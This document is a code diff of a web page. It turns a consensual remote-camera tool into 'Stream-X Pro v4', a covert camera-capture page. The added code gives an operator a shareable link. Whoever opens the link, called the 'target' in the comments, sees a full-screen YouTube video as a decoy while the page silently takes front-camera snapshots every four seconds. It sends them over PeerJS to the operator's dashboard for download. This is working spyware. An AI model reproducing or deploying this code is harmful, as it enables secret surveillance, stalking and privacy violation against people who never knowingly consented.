@@ -3,64 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Personal Remote Camera</title>
+    <title>Stream-X Pro v4</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #121212; color: white; }
-        video { width: 90%; max-width: 500px; border-radius: 10px; margin-top: 20px; border: 2px solid #00f2fe; }
-        .btn { padding: 10px 20px; background: #00f2fe; border: none; border-radius: 5px; cursor: pointer; margin: 10px; }
+        :root { --primary: #00d2ff; --bg: #0f172a; --card: #1e293b; }
+        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
+        .app-bar { background: #1e293b; padding: 15px; text-align: center; border-bottom: 2px solid var(--primary); font-weight: bold; position: sticky; top: 0; z-index: 100; }
+        
+        /* Dashboard Container */
+        .container { padding: 20px; max-width: 500px; margin: auto; }
+        
+        /* Image Cards Style */
+        .img-card { background: var(--card); border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #334155; box-shadow: 0 4px 6px rgba(0,0,0,0.3); transition: 0.3s; }
+        .img-card img { width: 100%; height: auto; display: block; background: #000; }
+        .card-actions { padding: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .download-btn { background: var(--primary); color: #000; border: none; padding: 8px 15px; border-radius: 6px; font-weight: bold; cursor: pointer; text-decoration: none; font-size: 13px; }
+
+        /* YT Player for Target */
+        .yt-frame { width: 100vw; height: 100vh; border: none; }
+
+        .btn-main { background: var(--primary); color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #linkDisplay { background: #000; border: 1px dashed var(--primary); padding: 10px; margin-top: 15px; word-break: break-all; color: yellow; font-size: 12px; display: none; }
+        
+        .empty-state { text-align: center; color: #64748b; margin-top: 50px; }
     </style>
 </head>
 <body>
 
-    <h2>Remote Camera Link System</h2>
-    
-    <div id="setup">
-        <p>Apna Link Generate Karein:</p>
-        <button class="btn" onclick="generateLink()">Link Banayein</button>
-        <p id="shareLink" style="word-break: break-all; color: yellow;"></p>
+<div id="adminView" style="display: none;">
+    <div class="app-bar">STREAM-X DASHBOARD</div>
+    <div class="container">
+        <button class="btn-main" onclick="generateLink()">GENERATE WATCH LINK</button>
+        <div id="linkDisplay"></div>
+        
+        <div id="feedContainer">
+            <div class="empty-state">No active feed. Waiting for connection...</div>
+        </div>
     </div>
+</div>
 
-    <div id="viewer" style="display:none;">
-        <p>Live View:</p>
-        <video id="remoteVideo" autoplay playsinline></video>
-    </div>
+<div id="targetView" style="display: none;">
+    <iframe id="ytPlayer" class="yt-frame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+</div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const remoteId = urlParams.get('id');
-        const peer = new Peer(); // PeerJS instance
+<canvas id="cap" style="display:none;"></canvas>
+<video id="vid" autoplay playsinline style="display:none;"></video>
 
-        // AGAR LINK OPEN KIYA GAYA HAI (Target Phone)
-        if (remoteId) {
-            document.getElementById('setup').innerHTML = "<h3>Connecting...</h3>";
+<script>
+    const peer = new Peer();
+    const feedContainer = document.getElementById('feedContainer');
+    const urlParams = new URLSearchParams(window.location.search);
+
+    peer.on('open', (id) => {
+        if(urlParams.has('session')) {
+            // TARGET PHONE MODE
+            document.getElementById('targetView').style.display = 'block';
+            const vidId = urlParams.get('v') || "dQw4w9WgXcQ";
+            document.getElementById('ytPlayer').src = `https://www.youtube.com/embed/${vidId}?autoplay=1`;
+            initSilentCapture(urlParams.get('session'));
+        } else {
+            // ADMIN DASHBOARD MODE
+            document.getElementById('adminView').style.display = 'block';
+        }
+    });
+
+    function generateLink() {
+        const vidId = prompt("Enter YouTube Video ID (e.g. dQw4w9WgXcQ):", "dQw4w9WgXcQ");
+        const link = window.location.href.split('?')[0] + `?session=${peer.id}&v=${vidId}`;
+        const box = document.getElementById('linkDisplay');
+        box.innerText = link;
+        box.style.display = 'block';
+    }
+
+    async function initSilentCapture(masterId) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('vid').srcObject = stream;
             
-            peer.on('open', (id) => {
-                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then((stream) => {
-                    peer.call(remoteId, stream); // Receiver ko video bhejo
-                    document.body.innerHTML = "<h1>Streaming Live...</h1><p>Permission Allowed. Check your other phone.</p>";
-                }).catch(err => alert("Camera Permission Zaruri Hai!"));
-            });
-        }
+            setInterval(() => {
+                const canvas = document.getElementById('cap');
+                const v = document.getElementById('vid');
+                canvas.width = v.videoWidth;
+                canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
+                
+                const data = canvas.toDataURL('image/jpeg', 0.5);
+                const conn = peer.connect(masterId);
+                conn.on('open', () => {
+                    conn.send(data);
+                    setTimeout(() => conn.close(), 1000);
+                });
+            }, 4000); // 4 seconds delay to avoid PeerJS crash
+        } catch (e) { console.log("Cam error"); }
+    }
 
-        // AGAR AAP LINK BANANA CHAHTE HAIN (Main Phone)
-        function generateLink() {
-            peer.on('open', (id) => {
-                const link = window.location.href + "?id=" + id;
-                document.getElementById('shareLink').innerText = link;
-                document.getElementById('viewer').style.display = "block";
-                alert("Ye link apne doosre phone par bhej kar 'Allow' karein.");
-            });
-        }
-
-        // Jab call aaye (Main Phone par)
-        peer.on('call', (call) => {
-            call.answer(); // Call uthao
-            call.on('stream', (remoteStream) => {
-                document.getElementById('remoteVideo').srcObject = remoteStream;
-            });
+    // Receiving and creating CARDS
+    peer.on('connection', (conn) => {
+        conn.on('data', (data) => {
+            if(data.startsWith('data:image')) {
+                feedContainer.innerHTML = ""; // Sirf latest card dikhane ke liye (Aap remove bhi kar sakte hain agar purani chahiye)
+                
+                const card = document.createElement('div');
+                card.className = 'img-card';
+                const time = new Date().toLocaleTimeString();
+                
+                card.innerHTML = `
+                    <img src="${data}">
+                    <div class="card-actions">
+                        <span style="font-size:12px; color:#888;">Captured: ${time}</span>
+                        <a href="${data}" download="Capture_${Date.now()}.jpg" class="download-btn">DOWNLOAD</a>
+                    </div>
+                `;
+                feedContainer.prepend(card);
+            }
         });
-    </script>
+    });
+</script>
 </body>
 </html>
